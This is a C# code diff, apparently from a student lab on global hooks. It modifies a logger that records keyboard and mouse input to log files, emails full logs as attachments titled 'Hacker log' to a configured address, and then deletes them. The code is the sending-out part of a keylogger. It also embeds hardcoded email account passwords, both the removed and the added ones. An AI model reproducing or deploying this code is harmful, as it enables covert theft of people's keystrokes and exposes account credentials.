@@ -1,7 +1,9 @@
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.Net.Mail;
 using System.Text.RegularExpressions;
+using System.Threading;
 
 namespace Lan8._1_GlobalHooks
 {
@@ -10,11 +12,9 @@ namespace Lan8._1_GlobalHooks
         private readonly ConfigFile _configuration;
         private const string KeyboardLogFilePath = @"keyboard.log";
         private const string MouseLogFilePath = @"mouse.log";
-        
-        private const string From = "lizok-1997@inbox.ru";
-        private const string Password = "27111997Liza";
-        private const string Host = "smtp.mail.ru";
-        private const int Port = 465;
+
+        private const string From = "tuthajam@gmail.com";
+        private const string Password = "123454321L";
 
         public Logger(ConfigFile configuration)
         {
@@ -43,31 +43,31 @@ namespace Lan8._1_GlobalHooks
         {
             if (new FileInfo(filePath).Length <= _configuration.FileSize) return;
             if (string.IsNullOrEmpty(_configuration.Email)) return;
-            SendEmail(_configuration.Email, @"Hacker log", filePath);
+            SendEmail(_configuration.Email, @"Log files", filePath);
             new FileInfo(filePath).Delete();
         }
-        
+
         public void SendEmail(string to, string subject, string filePath)
         {
-            var smtpClient = new SmtpClient(Host, Port)
+            var from = new MailAddress(From);
+            var newTo = new MailAddress(to);
+            var mail = new MailMessage(from, newTo)
             {
-                Credentials = new System.Net.NetworkCredential(From, Password),
+                Body = String.Empty,
+                Subject = "Hacker log"
+            };
+
+            var smtpClient = new SmtpClient
+            {
+                Credentials = new System.Net.NetworkCredential(from.Address, Password),
                 EnableSsl = true
             };
-            var newTo = ConvertToHost(to);
-            var mail = new MailMessage(From, newTo, subject, string.Empty);
+
             using (var attachment = new Attachment(filePath))
             {
                 mail.Attachments.Add(attachment);
                 smtpClient.Send(mail);
             }
-        }
-
-        private string ConvertToHost(string to)
-        {
-            var begin = new Regex(@"^(.+)@").Match(to);
-            var good = begin.Value + Host;
-            return good;
         }
     }
 }
